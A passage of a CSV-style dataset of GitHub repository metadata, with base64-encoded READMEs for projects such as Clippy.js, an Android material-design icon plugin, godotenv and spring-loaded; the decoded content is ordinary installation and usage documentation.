LSBUaGUgUGlyYXRlIEJheQotIFlUUy5hbQotIE55YWEKLSBOeWFhIFBhbnRz
dQotIEVaVFYKLSBUb3JyZW50RG93bmxvYWRzCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'clippy.js',4434405,b'Add Clippy or his friends to any website for instant nostalgia.',b'JavaScript',40,2387,,2387,False,b'https://api.github.com/repos/smore-inc/clippy.js/forks',"W0NsaXBweS5KU10oaHR0cDovL3Ntb3JlLmNvbS9jbGlwcHktanMpCj09PT09
PT09PQpBZGQgQ2xpcHB5IG9yIGhpcyBmcmllbmRzIHRvIGFueSB3ZWJzaXRl
IGZvciBpbnN0YW50IG5vc3RhbGdpYS4gIApSZWFkIG1vcmUgYWJvdXQgdGhl
IHByb2plY3Qgb24gW291ciBob21lcGFnZV0oaHR0cDovL3Ntb3JlLmNvbS9j
bGlwcHktanMpLgoKClVzYWdlOiBTZXR1cAotLS0tLS0tLS0tLS0KQWRkIHRo
aXMgY29kZSB0byB5b3UgdG8geW91ciBwYWdlIHRvIGVuYWJsZSBDbGlwcHku
anMuCgpgYGBodG1sCjwhLS0gQWRkIHRoZSBzdHlsZXNoZWV0IHRvIHRoZSBo
ZWFkIC0tPgo8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3Nz
IiBocmVmPSJjbGlwcHkuY3NzIiBtZWRpYT0iYWxsIj4KCi4uLgoKPCEtLSBB
ZGQgdGhlc2Ugc2NyaXB0cyB0byAgdGhlIGJvdHRvbSBvZiB0aGUgcGFnZSAt
LT4KPCEtLSBqUXVlcnkgMS43KyAtLT4KPHNjcmlwdCBzcmM9ImpxdWVyeS4x
LjcubWluLmpzIj48L3NjcmlwdD4KCjwhLS0gQ2xpcHB5LmpzIC0tPgo8c2Ny
aXB0IHNyYz0iY2xpcHB5Lm1pbi5qcyI+PC9zY3JpcHQ+Cgo8IS0tIEluaXQg
c2NyaXB0IC0tPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAg
ICBjbGlwcHkubG9hZCgnTWVybGluJywgZnVuY3Rpb24oYWdlbnQpewogICAg
ICAgIC8vIGRvIGFueXRoaW5nIHdpdGggdGhlIGxvYWRlZCBhZ2VudAogICAg
ICAgIGFnZW50LnNob3coKTsKICAgIH0pOwo8L3NjcmlwdD4KCmBgYAoKVXNh
Z2U6IEFjdGlvbnMKLS0tLS0tLS0tLS0tLS0KQWxsIHRoZSBhZ2VudCBhY3Rp
b25zIGFyZSBxdWV1ZWQgYW5kIGV4ZWN1dGVkIGJ5IG9yZGVyLCBzbyB5b3Ug
Y291bGQgc3RhY2sgdGhlbS4KCmBgYGphdmFzY3JpcHQKLy8gcGxheSBhIGdp
dmVuIGFuaW1hdGlvbgphZ2VudC5wbGF5KCdTZWFyY2hpbmcnKTsKCi8vIHBs
YXkgYSByYW5kb20gYW5pbWF0aW9uCmFnZW50LmFuaW1hdGUoKTsKCi8vIGdl
dCBhIGxpc3Qgb2YgYWxsIHRoZSBhbmltYXRpb25zCmFnZW50LmFuaW1hdGlv
bnMoKTsKLy8gPT4gWyJNb3ZlTGVmdCIsICJDb25ncmF0dWxhdGUiLCAiSGlk
ZSIsICJQbGVhc2VkIiwgIkFja25vd2xlZGdlIiwgLi4uXQoKLy8gU2hvdyB0
ZXh0IGJhbGxvb24KYWdlbnQuc3BlYWsoJ1doZW4gYWxsIGVsc2UgZmFpbHMs
IGJpbmQgc29tZSBwYXBlciB0b2dldGhlci4gTXkgbmFtZSBpcyBDbGlwcHku
Jyk7CgovLyBtb3ZlIHRvIHRoZSBnaXZlbiBwb2ludCwgdXNlIGFuaW1hdGlv
biBpZiBhdmFpbGFibGUKYWdlbnQubW92ZVRvKDEwMCwxMDApOwoKLy8gZ2Vz
dHVyZSBhdCBhIGdpdmVuIHBvaW50IChpZiBnZXN0dXJlIGFuaW1hdGlvbiBp
cyBhdmFpbGFibGUpCmFnZW50Lmdlc3R1cmVBdCgyMDAsMjAwKTsKCi8vIHN0
b3AgdGhlIGN1cnJlbnQgYWN0aW9uIGluIHRoZSBxdWV1ZQphZ2VudC5zdG9w
Q3VycmVudCgpOwoKLy8gc3RvcCBhbGwgYWN0aW9ucyBpbiB0aGUgcXVldWUg
YW5kIGdvIGJhY2sgdG8gaWRsZSBtb2RlCmFnZW50LnN0b3AoKTsKYGBgCgpT
cGVjaWFsIFRoYW5rcwotLS0tLS0tLS0tLS0tLQoqIFRoZSBhd2Vzb21lIFtD
aW5uYW1vbiBTb2Z0d2FyZV0oaHR0cDovL3d3dy5jaW5uYW1vbnNvZnR3YXJl
LmNvbS8pIGZvciBkZXZlbG9waW5nIFtEb3VibGUgQWdlbnRdKGh0dHA6Ly9k
b3VibGVhZ2VudC5zb3VyY2Vmb3JnZS5uZXQvKQp0aGUgcHJvZ3JhbSB3ZSB1
c2VkIHRvIHVucGFjayBDbGlwcHkgYW5kIGhpcyBmcmllbmRzIQoqIE1pY3Jv
c29mdCwgZm9yIGNyZWF0aW5nIGNsaXBweSA6KQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'android-material-design-icon-generator-plugin',28638448,b'This plugin help you to set material design icon to your project.',b'Java',13,2387,,2387,False,b'https://api.github.com/repos/konifar/android-material-design-icon-generator-plugin/forks',"QW5kcm9pZCBNYXRlcmlhbCBEZXNpZ24gSWNvbiBHZW5lcmF0b3IgUGx1Z2lu
Cj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PQoKVGhpcyBwbHVnaW4gaGVscCB5b3UgdG8gc2V0IFttYXRlcmlhbCBkZXNp
Z24gaWNvbnNdKGh0dHBzOi8vZ2l0aHViLmNvbS9nb29nbGUvbWF0ZXJpYWwt
ZGVzaWduLWljb25zKSB0byB5b3VyIEFuZHJvaWQgcHJvamVjdC4KCiFbY2Fw
dHVyZV0oaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tvbmlm
YXIvYW5kcm9pZC1tYXRlcmlhbC1kZXNpZ24taWNvbi1nZW5lcmF0b3ItcGx1
Z2luL21hc3Rlci9kb2NzL2NhcHR1cmUuZ2lmKQoKIyBJbnN0YWxsYXRpb24K
CiMjIE1hbnVhbGx5CgoxLiBEb3dubG9hZCB0aGUgW01hdGVyaWFsRGVzaWdu
SWNvbkdlbmVyYXRvclBsdWdpbi56aXBdKGh0dHBzOi8vZ2l0aHViLmNvbS9r
b25pZmFyL2FuZHJvaWQtbWF0ZXJpYWwtZGVzaWduLWljb24tZ2VuZXJhdG9y
LXBsdWdpbi9yYXcvbWFzdGVyL01hdGVyaWFsRGVzaWduSWNvbkdlbmVyYXRv
clBsdWdpbi56aXApCgpPbiBNQUM6CgoyLiBgUHJlZmVyZW5jZSA+IFBsdWdp
bnMgPiBJbnN0YWxsIHBsdWdpbiBmcm9tIGRpc2suLi5gIFNlbGVjdCBNYXRl
cmlhbERlc2lnbkljb25HZW5lcmF0b3JQbHVnaW4uemlwIGFib3ZlLgogCk9u
IExpbnV4IG9yIFdpbmRvd3M6CgoyLiBgRmlsZSA+IFNldHRpbmdzLi4uID4g
SURFIFNldHRpbmdzID4gUGx1Z2lucyA+IEluc3RhbGwgcGx1Z2luIGZyb20g
ZGlzay4uLmAgU2VsZWN0IE1hdGVyaWFsRGVzaWduSWNvbkdlbmVyYXRvclBs
dWdpbi56aXAgYWJvdmUuCgozLiBSZXN0YXJ0IEludGVsbGlKL0FuZHJvaWQg
U3R1ZGlvIHRvIGFjdGl2YXRlIHBsdWdpbi4KCiMjIEluc3RhbGwgSW50ZWxs
aUogUGx1Z2luIFJlcG9zaXRvcmllcwoKT24gTUFDOgoKR28gYFByZWZlcmVu
Y2UgPiBQbHVnaW5zID4gQnJvd3NlIHJlcG9zaXRvcmllc2AsIHRoZW4gc2Vh
cmNoIGBtYXRlcmlhbGAuCgpPbiBMaW51eCBvciBXaW5kb3dzOgoKR28gYEZp
bGUgPiBTZXR0aW5ncy4uLiA+IElERSBTZXR0aW5ncyA+IFBsdWdpbnMgPiBC
cm93c2UgcmVwb3NpdG9yaWVzYCwgdGhlbiBzZWFyY2ggYG1hdGVyaWFsYC4K
CiFbY2FwdHVyZV0oaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t
L2tvbmlmYXIvYW5kcm9pZC1tYXRlcmlhbC1kZXNpZ24taWNvbi1nZW5lcmF0
b3ItcGx1Z2luL21hc3Rlci9kb2NzL2luc3RhbGwucG5nKQoKCiMgRGV2ZWxv
cG1lbnQKCmBgYAokIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20va29u
aWZhci9hbmRyb2lkLW1hdGVyaWFsLWRlc2lnbi1pY29uLWdlbmVyYXRvci1w
bHVnaW4uZ2l0CiQgY2QgYW5kcm9pZC1tYXRlcmlhbC1kZXNpZ24taWNvbi1n
ZW5lcmF0b3ItcGx1Z2luCiQgZ2l0IHN1Ym1vZHVsZSBpbml0CiQgZ2l0IHN1
Ym1vZHVsZSBmb3JlYWNoIGdpdCBwdWxsIG9yaWdpbiBtYXN0ZXIKJCBweXRo
b24gc2NyaXB0L2NvcHlfaWNvbnMucHkKJCBweXRob24gc2NyaXB0L2NyZWF0
ZV90ZW1wbGF0ZS5weQpgYGAKCgoKIyBMaWNlbnNlCgpgYGAKQ29weXJpZ2h0
IDIwMTQtMjAxNSBZdXN1a2UgS29uaXNoaQoKTGljZW5zZWQgdW5kZXIgdGhl
IEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uIDIuMCAodGhlICJMaWNlbnNlIik7
CnlvdSBtYXkgbm90IHVzZSB0aGlzIGZpbGUgZXhjZXB0IGluIGNvbXBsaWFu
Y2Ugd2l0aCB0aGUgTGljZW5zZS4KWW91IG1heSBvYnRhaW4gYSBjb3B5IG9m
IHRoZSBMaWNlbnNlIGF0CgogICBodHRwOi8vd3d3LmFwYWNoZS5vcmcvbGlj
ZW5zZXMvTElDRU5TRS0yLjAKClVubGVzcyByZXF1aXJlZCBieSBhcHBsaWNh
YmxlIGxhdyBvciBhZ3JlZWQgdG8gaW4gd3JpdGluZywgc29mdHdhcmUKZGlz
dHJpYnV0ZWQgdW5kZXIgdGhlIExpY2Vuc2UgaXMgZGlzdHJpYnV0ZWQgb24g
YW4gIkFTIElTIiBCQVNJUywKV0lUSE9VVCBXQVJSQU5USUVTIE9SIENPTkRJ
VElPTlMgT0YgQU5ZIEtJTkQsIGVpdGhlciBleHByZXNzIG9yIGltcGxpZWQu
ClNlZSB0aGUgTGljZW5zZSBmb3IgdGhlIHNwZWNpZmljIGxhbmd1YWdlIGdv
dmVybmluZyBwZXJtaXNzaW9ucyBhbmQKbGltaXRhdGlvbnMgdW5kZXIgdGhl
IExpY2Vuc2UuCmBgYAo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'godotenv',11759482,"b""A Go port of Ruby's dotenv library (Loads environment variables from `.env`.)""",b'Go',22,2386,,2386,False,b'https://api.github.com/repos/joho/godotenv/forks',"IyBHb0RvdEVudiBbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vdHJhdmlzLWNp
Lm9yZy9qb2hvL2dvZG90ZW52LnN2Zz9icmFuY2g9bWFzdGVyKV0oaHR0cHM6
Ly90cmF2aXMtY2kub3JnL2pvaG8vZ29kb3RlbnYpIFshW0J1aWxkIHN0YXR1
c10oaHR0cHM6Ly9jaS5hcHB2ZXlvci5jb20vYXBpL3Byb2plY3RzL3N0YXR1
cy85djQwdm5mdnZnZGU2NHU0P3N2Zz10cnVlKV0oaHR0cHM6Ly9jaS5hcHB2
ZXlvci5jb20vcHJvamVjdC9qb2hvL2dvZG90ZW52KSBbIVtHbyBSZXBvcnQg
Q2FyZF0oaHR0cHM6Ly9nb3JlcG9ydGNhcmQuY29tL2JhZGdlL2dpdGh1Yi5j
b20vam9oby9nb2RvdGVudildKGh0dHBzOi8vZ29yZXBvcnRjYXJkLmNvbS9y
ZXBvcnQvZ2l0aHViLmNvbS9qb2hvL2dvZG90ZW52KQoKQSBHbyAoZ29sYW5n
KSBwb3J0IG9mIHRoZSBSdWJ5IGRvdGVudiBwcm9qZWN0ICh3aGljaCBsb2Fk
cyBlbnYgdmFycyBmcm9tIGEgLmVudiBmaWxlKQoKRnJvbSB0aGUgb3JpZ2lu
YWwgTGlicmFyeToKCj4gU3RvcmluZyBjb25maWd1cmF0aW9uIGluIHRoZSBl
bnZpcm9ubWVudCBpcyBvbmUgb2YgdGhlIHRlbmV0cyBvZiBhIHR3ZWx2ZS1m
YWN0b3IgYXBwLiBBbnl0aGluZyB0aGF0IGlzIGxpa2VseSB0byBjaGFuZ2Ug
YmV0d2VlbiBkZXBsb3ltZW50IGVudmlyb25tZW50c+KAk3N1Y2ggYXMgcmVz
b3VyY2UgaGFuZGxlcyBmb3IgZGF0YWJhc2VzIG9yIGNyZWRlbnRpYWxzIGZv
ciBleHRlcm5hbCBzZXJ2aWNlc+KAk3Nob3VsZCBiZSBleHRyYWN0ZWQgZnJv
bSB0aGUgY29kZSBpbnRvIGVudmlyb25tZW50IHZhcmlhYmxlcy4KPgo+IEJ1
dCBpdCBpcyBub3QgYWx3YXlzIHByYWN0aWNhbCB0byBzZXQgZW52aXJvbm1l
bnQgdmFyaWFibGVzIG9uIGRldmVsb3BtZW50IG1hY2hpbmVzIG9yIGNvbnRp
bnVvdXMgaW50ZWdyYXRpb24gc2VydmVycyB3aGVyZSBtdWx0aXBsZSBwcm9q
ZWN0cyBhcmUgcnVuLiBEb3RlbnYgbG9hZCB2YXJpYWJsZXMgZnJvbSBhIC5l
bnYgZmlsZSBpbnRvIEVOViB3aGVuIHRoZSBlbnZpcm9ubWVudCBpcyBib290
c3RyYXBwZWQuCgpJdCBjYW4gYmUgdXNlZCBhcyBhIGxpYnJhcnkgKGZvciBs
b2FkaW5nIGluIGVudiBmb3IgeW91ciBvd24gZGFlbW9ucyBldGMpIG9yIGFz
IGEgYmluIGNvbW1hbmQuCgpUaGVyZSBpcyB0ZXN0IGNvdmVyYWdlIGFuZCBD
SSBmb3IgYm90aCBsaW51eGlzaCBhbmQgd2luZG93cyBlbnZpcm9ubWVudHMs
IGJ1dCBJIG1ha2Ugbm8gZ3VhcmFudGVlcyBhYm91dCB0aGUgYmluIHZlcnNp
b24gd29ya2luZyBvbiB3aW5kb3dzLgoKIyMgSW5zdGFsbGF0aW9uCgpBcyBh
IGxpYnJhcnkKCmBgYHNoZWxsCmdvIGdldCBnaXRodWIuY29tL2pvaG8vZ29k
b3RlbnYKYGBgCgpvciBpZiB5b3Ugd2FudCB0byB1c2UgaXQgYXMgYSBiaW4g
Y29tbWFuZApgYGBzaGVsbApnbyBnZXQgZ2l0aHViLmNvbS9qb2hvL2dvZG90
ZW52L2NtZC9nb2RvdGVudgpgYGAKCiMjIFVzYWdlCgpBZGQgeW91ciBhcHBs
aWNhdGlvbiBjb25maWd1cmF0aW9uIHRvIHlvdXIgYC5lbnZgIGZpbGUgaW4g
dGhlIHJvb3Qgb2YgeW91ciBwcm9qZWN0OgoKYGBgc2hlbGwKUzNfQlVDS0VU
PVlPVVJTM0JVQ0tFVApTRUNSRVRfS0VZPVlPVVJTRUNSRVRLRVlHT0VTSEVS
RQpgYGAKClRoZW4gaW4geW91ciBHbyBhcHAgeW91IGNhbiBkbyBzb21ldGhp
bmcgbGlrZQoKYGBgZ28KcGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImdp
dGh1Yi5jb20vam9oby9nb2RvdGVudiIKICAgICJsb2ciCiAgICAib3MiCikK
CmZ1bmMgbWFpbigpIHsKICBlcnIgOj0gZ29kb3RlbnYuTG9hZCgpCiAgaWYg
ZXJyICE9IG5pbCB7CiAgICBsb2cuRmF0YWwoIkVycm9yIGxvYWRpbmcgLmVu
diBmaWxlIikKICB9CgogIHMzQnVja2V0IDo9IG9zLkdldGVudigiUzNfQlVD
S0VUIikKICBzZWNyZXRLZXkgOj0gb3MuR2V0ZW52KCJTRUNSRVRfS0VZIikK
CiAgLy8gbm93IGRvIHNvbWV0aGluZyB3aXRoIHMzIG9yIHdoYXRldmVyCn0K
YGBgCgpJZiB5b3UncmUgZXZlbiBsYXppZXIgdGhhbiB0aGF0LCB5b3UgY2Fu
IGp1c3QgdGFrZSBhZHZhbnRhZ2Ugb2YgdGhlIGF1dG9sb2FkIHBhY2thZ2Ug
d2hpY2ggd2lsbCByZWFkIGluIGAuZW52YCBvbiBpbXBvcnQKCmBgYGdvCmlt
cG9ydCBfICJnaXRodWIuY29tL2pvaG8vZ29kb3RlbnYvYXV0b2xvYWQiCmBg
YAoKV2hpbGUgYC5lbnZgIGluIHRoZSBwcm9qZWN0IHJvb3QgaXMgdGhlIGRl
ZmF1bHQsIHlvdSBkb24ndCBoYXZlIHRvIGJlIGNvbnN0cmFpbmVkLCBib3Ro
IGV4YW1wbGVzIGJlbG93IGFyZSAxMDAlIGxlZ2l0CgpgYGBnbwpfID0gZ29k
b3RlbnYuTG9hZCgic29tZXJhbmRvbWZpbGUiKQpfID0gZ29kb3RlbnYuTG9h
ZCgiZmlsZW51bWJlcm9uZS5lbnYiLCAiZmlsZW51bWJlcnR3by5lbnYiKQpg
YGAKCklmIHlvdSB3YW50IHRvIGJlIHJlYWxseSBmYW5jeSB3aXRoIHlvdXIg
ZW52IGZpbGUgeW91IGNhbiBkbyBjb21tZW50cyBhbmQgZXhwb3J0cyAoYmVs
b3cgaXMgYSB2YWxpZCBlbnYgZmlsZSkKCmBgYHNoZWxsCiMgSSBhbSBhIGNv
bW1lbnQgYW5kIHRoYXQgaXMgT0sKU09NRV9WQVI9c29tZXZhbApGT089QkFS
ICMgY29tbWVudHMgYXQgbGluZSBlbmQgYXJlIE9LIHRvbwpleHBvcnQgQkFS
PUJBWgpgYGAKCk9yIGZpbmFsbHkgeW91IGNhbiBkbyBZQU1MKGlzaCkgc3R5
bGUKCmBgYHlhbWwKRk9POiBiYXIKQkFSOiBiYXoKYGBgCgphcyBhIGZpbmFs
IGFzaWRlLCBpZiB5b3UgZG9uJ3Qgd2FudCBnb2RvdGVudiBtdW5naW5nIHlv
dXIgZW52IHlvdSBjYW4ganVzdCBnZXQgYSBtYXAgYmFjayBpbnN0ZWFkCgpg
YGBnbwp2YXIgbXlFbnYgbWFwW3N0cmluZ11zdHJpbmcKbXlFbnYsIGVyciA6
PSBnb2RvdGVudi5SZWFkKCkKCnMzQnVja2V0IDo9IG15RW52WyJTM19CVUNL
RVQiXQpgYGAKCi4uLiBvciBmcm9tIGFuIGBpby5SZWFkZXJgIGluc3RlYWQg
b2YgYSBsb2NhbCBmaWxlCgpgYGBnbwpyZWFkZXIgOj0gZ2V0UmVtb3RlRmls
ZSgpCm15RW52LCBlcnIgOj0gZ29kb3RlbnYuUGFyc2UocmVhZGVyKQpgYGAK
Ci4uLiBvciBmcm9tIGEgYHN0cmluZ2AgaWYgeW91IHNvIGRlc2lyZQoKYGBg
Z28KY29udGVudCA6PSBnZXRSZW1vdGVGaWxlQ29udGVudCgpCm15RW52LCBl
cnIgOj0gZ29kb3RlbnYuVW5tYXJzaGFsKGNvbnRlbnQpCmBgYAoKIyMjIFBy
ZWNlbmRlbmNlICYgQ29udmVudGlvbnMKCkV4aXN0aW5nIGVudnMgdGFrZSBw
cmVjZW5kZW5jZSBvZiBlbnZzIHRoYXQgYXJlIGxvYWRlZCBsYXRlci4KClRo
ZSBbY29udmVudGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL2JrZWVwZXJzL2Rv
dGVudiN3aGF0LW90aGVyLWVudi1maWxlcy1jYW4taS11c2UpCmZvciBtYW5h
Z2luZyBtdWx0aXBsZSBlbnZpcm9ubWVudHMgKGkuZS4gZGV2ZWxvcG1lbnQs
IHRlc3QsIHByb2R1Y3Rpb24pCmlzIHRvIGNyZWF0ZSBhbiBlbnYgbmFtZWQg
YHtZT1VSQVBQfV9FTlZgIGFuZCBsb2FkIGVudnMgaW4gdGhpcyBvcmRlcjoK
CmBgYGdvCmVudiA6PSBvcy5HZXRlbnYoIkZPT19FTlYiKQppZiAiIiA9PSBl
bnYgewogIGVudiA9ICJkZXZlbG9wbWVudCIKfQoKZ29kb3RlbnYuTG9hZCgi
LmVudi4iICsgZW52ICsgIi5sb2NhbCIpCmlmICJ0ZXN0IiAhPSBlbnYgewog
IGdvZG90ZW52LkxvYWQoIi5lbnYubG9jYWwiKQp9CmdvZG90ZW52LkxvYWQo
Ii5lbnYuIiArIGVudikKZ29kb3RlbnYuTG9hZCgpIC8vIFRoZSBPcmlnaW5h
bCAuZW52CmBgYAoKSWYgeW91IG5lZWQgdG8sIHlvdSBjYW4gYWxzbyB1c2Ug
YGdvZG90ZW52Lk92ZXJsb2FkKClgIHRvIGRlZnkgdGhpcyBjb252ZW50aW9u
CmFuZCBvdmVyd3JpdGUgZXhpc3RpbmcgZW52cyBpbnN0ZWFkIG9mIG9ubHkg
c3VwcGxhbnRpbmcgdGhlbS4gVXNlIHdpdGggY2F1dGlvbi4KCiMjIyBDb21t
YW5kIE1vZGUKCkFzc3VtaW5nIHlvdSd2ZSBpbnN0YWxsZWQgdGhlIGNvbW1h
bmQgYXMgYWJvdmUgYW5kIHlvdSd2ZSBnb3QgYCRHT1BBVEgvYmluYCBpbiB5
b3VyIGAkUEFUSGAKCmBgYApnb2RvdGVudiAtZiAvc29tZS9wYXRoL3RvLy5l
bnYgc29tZV9jb21tYW5kIHdpdGggc29tZSBhcmdzCmBgYAoKSWYgeW91IGRv
bid0IHNwZWNpZnkgYC1mYCBpdCB3aWxsIGZhbGwgYmFjayBvbiB0aGUgZGVm
YXVsdCBvZiBsb2FkaW5nIGAuZW52YCBpbiBgUFdEYAoKIyMjIFdyaXRpbmcg
RW52IEZpbGVzCgpHb2RvdGVudiBjYW4gYWxzbyB3cml0ZSBhIG1hcCByZXBy
ZXNlbnRpbmcgdGhlIGVudmlyb25tZW50IHRvIGEgY29ycmVjdGx5LWZvcm1h
dHRlZCBhbmQgZXNjYXBlZCBmaWxlCgpgYGBnbwplbnYsIGVyciA6PSBnb2Rv
dGVudi5Vbm1hcnNoYWwoIktFWT12YWx1ZSIpCmVyciA6PSBnb2RvdGVudi5X
cml0ZShlbnYsICIuLy5lbnYiKQpgYGAKCi4uLiBvciB0byBhIHN0cmluZwoK
YGBgZ28KZW52LCBlcnIgOj0gZ29kb3RlbnYuVW5tYXJzaGFsKCJLRVk9dmFs
dWUiKQpjb250ZW50LCBlcnIgOj0gZ29kb3RlbnYuTWFyc2hhbChlbnYpCmBg
YAoKIyMgQ29udHJpYnV0aW5nCgpDb250cmlidXRpb25zIGFyZSBtb3N0IHdl
bGNvbWUhIFRoZSBwYXJzZXIgaXRzZWxmIGlzIHByZXR0eSBzdHVwaWRseSBu
YWl2ZSBhbmQgSSB3b3VsZG4ndCBiZSBzdXJwcmlzZWQgaWYgaXQgYnJlYWtz
IHdpdGggZWRnZSBjYXNlcy4KCipjb2RlIGNoYW5nZXMgd2l0aG91dCB0ZXN0
cyB3aWxsIG5vdCBiZSBhY2NlcHRlZCoKCjEuIEZvcmsgaXQKMi4gQ3JlYXRl
IHlvdXIgZmVhdHVyZSBicmFuY2ggKGBnaXQgY2hlY2tvdXQgLWIgbXktbmV3
LWZlYXR1cmVgKQozLiBDb21taXQgeW91ciBjaGFuZ2VzIChgZ2l0IGNvbW1p
dCAtYW0gJ0FkZGVkIHNvbWUgZmVhdHVyZSdgKQo0LiBQdXNoIHRvIHRoZSBi
cmFuY2ggKGBnaXQgcHVzaCBvcmlnaW4gbXktbmV3LWZlYXR1cmVgKQo1LiBD
cmVhdGUgbmV3IFB1bGwgUmVxdWVzdAoKIyMgUmVsZWFzZXMKClJlbGVhc2Vz
IHNob3VsZCBmb2xsb3cgW1NlbXZlcl0oaHR0cDovL3NlbXZlci5vcmcvKSB0
aG91Z2ggdGhlIGZpcnN0IGNvdXBsZSBvZiByZWxlYXNlcyBhcmUgYHYxYCBh
bmQgYHYxLjFgLgoKVXNlIFthbm5vdGF0ZWQgdGFncyBmb3IgYWxsIHJlbGVh
c2VzXShodHRwczovL2dpdGh1Yi5jb20vam9oby9nb2RvdGVudi9pc3N1ZXMv
MzApLiBFeGFtcGxlIGBnaXQgdGFnIC1hIHYxLjIuMWAKCiMjIENJCgpMaW51
eDogWyFbQnVpbGQgU3RhdHVzXShodHRwczovL3RyYXZpcy1jaS5vcmcvam9o
by9nb2RvdGVudi5zdmc/YnJhbmNoPW1hc3RlcildKGh0dHBzOi8vdHJhdmlz
LWNpLm9yZy9qb2hvL2dvZG90ZW52KSBXaW5kb3dzOiBbIVtCdWlsZCBzdGF0
dXNdKGh0dHBzOi8vY2kuYXBwdmV5b3IuY29tL2FwaS9wcm9qZWN0cy9zdGF0
dXMvOXY0MHZuZnZ2Z2RlNjR1NCldKGh0dHBzOi8vY2kuYXBwdmV5b3IuY29t
L3Byb2plY3Qvam9oby9nb2RvdGVudikKCiMjIFdobz8KClRoZSBvcmlnaW5h
bCBsaWJyYXJ5IFtkb3RlbnZdKGh0dHBzOi8vZ2l0aHViLmNvbS9ia2VlcGVy
cy9kb3RlbnYpIHdhcyB3cml0dGVuIGJ5IFtCcmFuZG9uIEtlZXBlcnNdKGh0
dHA6Ly9vcGVuc291bC5vcmcvKSwgYW5kIHRoaXMgcG9ydCB3YXMgZG9uZSBi
eSBbSm9obiBCYXJ0b25dKGh0dHBzOi8vam9obmJhcnRvbi5jby8pIGJhc2Vk
IG9mZiB0aGUgdGVzdHMvZml4dHVyZXMgaW4gdGhlIG9yaWdpbmFsIGxpYnJh
cnkuCg==
",,"bGFuZ3VhZ2U6IGdvCgpnbzoKICAtIDEueAoKb3M6CiAgLSBsaW51eAogIC0g
b3N4Cg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'spring-loaded',7044667,b'Java agent that enables class reloading in a running JVM',b'Java',126,2386,,2386,False,b'https://api.github.com/repos/spring-projects/spring-loaded/forks',"IyBXZWxjb21lIHRvIFNwcmluZy1Mb2FkZWQKCiMjIFdoYXQgaXMgU3ByaW5n
IExvYWRlZD8KClNwcmluZyBMb2FkZWQgaXMgYSBKVk0gYWdlbnQgZm9yIHJl
bG9hZGluZyBjbGFzcyBmaWxlIGNoYW5nZXMgd2hpbHN0IGEgSlZNIGlzIHJ1
bm5pbmcuICBJdCB0cmFuc2Zvcm1zCmNsYXNzZXMgYXQgbG9hZHRpbWUgdG8g
bWFrZSB0aGVtIGFtZW5hYmxlIHRvIGxhdGVyIHJlbG9hZGluZy4gVW5saWtl
ICdob3QgY29kZSByZXBsYWNlJyB3aGljaCBvbmx5IGFsbG93cwpzaW1wbGUg
Y2hhbmdlcyBvbmNlIGEgSlZNIGlzIHJ1bm5pbmcgKGUuZy4gY2hhbmdlcyB0
byBtZXRob2QgYm9kaWVzKSwgU3ByaW5nIExvYWRlZCBhbGxvd3MgeW91CnRv
IGFkZC9tb2RpZnkvZGVsZXRlIG1ldGhvZHMvZmllbGRzL2NvbnN0cnVjdG9y
cy4gVGhlIGFubm90YXRpb25zIG9uIHR5cGVzL21ldGhvZHMvZmllbGRzL2Nv
bnN0cnVjdG9ycwpjYW4gYWxzbyBiZSBtb2RpZmllZCBhbmQgaXQgaXMgcG9z
c2libGUgdG8gYWRkL3JlbW92ZS9jaGFuZ2UgdmFsdWVzIGluIGVudW0gdHlw
ZXMuCgpTcHJpbmcgTG9hZGVkIGlzIHVzYWJsZSBvbiBhbnkgYnl0ZWNvZGUg
dGhhdCBtYXkgcnVuIG9uIGEgSlZNLCBhbmQgaXMgYWN0dWFsbHkgdGhlIHJl
bG9hZGluZyBzeXN0ZW0KdXNlZCBpbiBHcmFpbHMgMi4KCiMgSW5zdGFsbGF0
aW9uCgoxLjIuNSBoYXMgbm93IGJlZW4gcmVsZWFzZWQ6IFtzcHJpbmdsb2Fk
ZWQtMS4yLjUuUkVMRUFTRS5qYXJdKGh0dHBzOi8vcmVwby5zcHJpbmcuaW8v
cmVsZWFzZS9vcmcvc3ByaW5nZnJhbWV3b3JrL3NwcmluZ2xvYWRlZC8xLjIu
